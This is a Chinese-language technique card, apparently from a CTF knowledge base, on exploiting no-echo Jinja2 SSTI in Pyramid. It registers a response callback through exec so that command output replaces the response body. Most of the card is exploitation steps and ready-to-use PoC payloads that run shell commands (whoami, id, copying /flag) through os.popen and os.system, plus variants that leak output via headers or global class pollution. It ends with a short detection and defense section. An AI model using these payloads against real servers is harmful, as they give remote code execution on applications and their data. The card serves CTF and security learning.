---
id: web-python-ssti-pyramid-request-response-callback-echo
title: Pyramid 无回显 SSTI：用 request.add_response_callback 注册 lambda，在响应发出前把 command 输出写进 response.text
type: scenario
domain: web
path: web/python/ssti
technique: pyramid-request-response-callback-ssti-echo
aliases:
- Pyramid SSTI 无回显
- add_response_callback 回显
- add_finished_callback 回显
- request 钩子改响应 body
- jinja2 exec request 声明
tags:
- python
- pyramid
- ssti
- jinja2
- no-echo
- callback
- memshell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:35:28+08:00'
  notes: '已对照原文核对（ez_Gallery 预期解）：shell_view 丢弃渲染结果、add_response_callback/add_finished_callback 两个 request 钩子、exec 显式传 {''request'': request} 声明作用域、cycler/x 取 __builtins__ 均与正文一致；本次核对未读取图片，仅依据正文；未验证点为正文 /shell 的 blacklist_patterns（禁数字、length、count）卡中未体现，实际 payload 需避开这些词；回显效果依赖正文 img/16 截图'
---

## 一句话结论

当 Pyramid 视图把 SSTI 的渲染结果丢掉（只 `return Response('success')`）时，仍然可以在模板里用 `exec` 执行任意 Python，调用 `request.add_response_callback(lambda request, response: setattr(response, 'text', __import__('os').popen('whoami').read()))`；Pyramid 会在本次响应发出前调用这个回调，把命令输出直接替换成响应体，无回显即刻变成有回显，且不需要写文件、不需要出网。

## 原理

- **钩子挂在 request 上**：Pyramid 的 `Request` 提供 `add_response_callback` 与 `add_finished_callback`。前者注册的回调在响应对象已经生成、但尚未发送时被调用，签名是 `(request, response)`，拿到的是**即将返回的那个 response 对象本身**；后者在响应发送完成后调用。因此只要能在渲染期拿到 `request`，就能在响应落地前改写它。
- **为什么可以改 body**：Pyramid 的 `Response` 是 `WebOb` 风格对象，`text`/`body`/`headerlist` 都是可写属性。回调里 `setattr(response, 'text', ...)` 改的就是即将序列化的 body，视图原本 `return` 什么已经不重要。
- **为什么需要借助 `exec` 而不是直接写 lambda**：Jinja2 表达式里能构造 lambda，但 `request` 只存在于渲染上下文（视图通过 `renderer` 传的 `{'request': request}`）而不在 lambda 被求值时的 Python 全局作用域里；把代码交给 `__builtins__['exec']` 时显式传 `{'request': request}` 作为局部命名空间，lambda 定义时就能闭包捕获 `request` 名。
- **为什么这算完整利用而非半条链**：SSTI 本身已是任意 Python 代码执行；本技巧解决的是「执行结果回不来」这一常见卡点，回显通道与命令执行分离，一次请求注入、同一响应读出。
- **为什么比改写全局类属性更稳**：改 `wsgiref` handler 的类属性会影响后续所有请求、也容易被反向代理吞掉状态行；`add_response_callback` 只作用于当前请求的响应体，语义最接近「正常页面输出」。

## 触发条件

- Jinja2 使用非沙箱环境（`jinja2.Environment(loader=BaseLoader()).from_string(tpl).render({...})`、`render_template_string`），用户输入进入模板串。
- 视图在 render 时把 `request` 放进渲染上下文（Pyramid 视图通常直接 `{'request': request}` 或依赖 `request` 全局）。
- 渲染结果被丢弃或固定返回（例如 `if result != None: return Response('success')`），因此常规 `{{7*7}}` 式回显不可用。
- 能在模板里取到 `__builtins__`（`cycler.__init__.__globals__.__builtins__` 或 `x.__init__.__globals__.__builtins__`，`lipsum`/`cycler` 等 Jinja 全局函数任一即可）。
- 命令执行未被 `disable_functions`/seccomp 之类限制（Python 层无 `disable_functions`，但可能有只读挂载）。

## 利用步骤

1. 定位 SSTI 参数与渲染方式，确认无回显：`{{7*7}}` 返回固定文案说明结果被吞，但表达式仍被求值。
2. 验证对象图可用：`{{cycler.__init__.__globals__.os}}` 或 `{{cycler.__init__.__globals__.__builtins__}}` 能取到即成功。
3. 用 `exec` 注册回调，显式传入 `{'request': request}` 让 lambda 捕获 request：
   `cycler.__init__.__globals__.__builtins__['exec']("request.add_response_callback(lambda request, response: setattr(response, 'text', __import__('os').popen('id').read()))", {'request': request})`
4. 同一请求的响应体会变成 `id` 的输出；对同一 URL 再发一次即可稳定读命令结果（回调是按请求注册的，注入请求本身也生效）。
5. 需要多条命令时把 `popen` 换成 `subprocess.check_output(cmd, shell=True)`，或用 `add_finished_callback` 在响应写出后再做动作（例如把结果写到 header 或另一处）。
6. 若响应体会被框架再包一层（如模板渲染后又被 `Response` 覆盖），改用 `setattr(response, 'headerlist', [...])` 把结果塞进自定义响应头，或同时改 `response.status` 便于定位。

## PoC

```jinja2
{{cycler.__init__.__globals__.__builtins__['exec']("request.add_response_callback(lambda request, response: setattr(response, 'text', __import__('os').popen('whoami').read()))",{'request': request})}}
```

等价的第二条入口（`x` 为 Jinja 上下文里任意对象）：

```jinja2
{{x.__init__.__globals__.__builtins__['exec']("request.add_response_callback(lambda request, response: setattr(response, 'text', __import__('os').popen('id').read()))",{'request': request})}}
```

响应发送后执行的变体（适合需要「先返回、后动作」的场景）：

```jinja2
{{cycler.__init__.__globals__.__builtins__['exec']("request.add_finished_callback(lambda request: __import__('os').system('cp /flag /tmp/x'))",{'request': request})}}
```

## 变体与关联

- **同类钩子**：`add_finished_callback` 在响应写完后触发，可用于落地文件、发起二次请求或清痕迹，但不改当前 body。
- **改响应头而非 body**：`setattr(response, 'headerlist', [('X-R', out)])`，适合 body 被下游模板再次覆盖的场合。
- **改全局类属性**：`wsgiref.simple_server.ServerHandler.server_software` / `BaseHandler.error_body`、Pyramid `HTTPNotFound.explanation` 也能把输出顶到状态行、`Server:` 头或 404 页，见同目录 wsgiref handler 属性污染卡；两者区别在于全局生效 vs 单请求生效。
- **内存马方向的替代**：FastAPI 有 `app.add_api_route` 注入路由，Pyramid 若 `config` 是局部变量则不可达，此时 request 钩子是等价落点。
- **关联入口**：本类题常见前置为「验证码可识别 → 弱口令爆破」拿到登录态、再用 `file` 参数任意文件读取拿到源码，确认 SSTI 与无回显行为。

## 检测与防御

- 使用 `SandboxedEnvironment`/`StrictUndefined`，禁止把用户输入交给 `from_string`/`render_template_string`；模板名白名单。
- 禁用/清理渲染上下文中的 `request`、`config` 等高价值对象；不要把整个 `request` 传给模板。
- WAF/代码审计关注 `add_response_callback`、`add_finished_callback`、`__builtins__`、`__globals__`、`exec(` 在请求参数中的出现。
- 运行期检测：同一进程内出现「响应体被非视图代码改写」「回调注册来自模板求值」的异常调用栈；对 `os.popen`/`subprocess` 调用做审计。
- 最小权限运行：只读文件系统 + 无出网，降低拿到回显后的进一步危害。
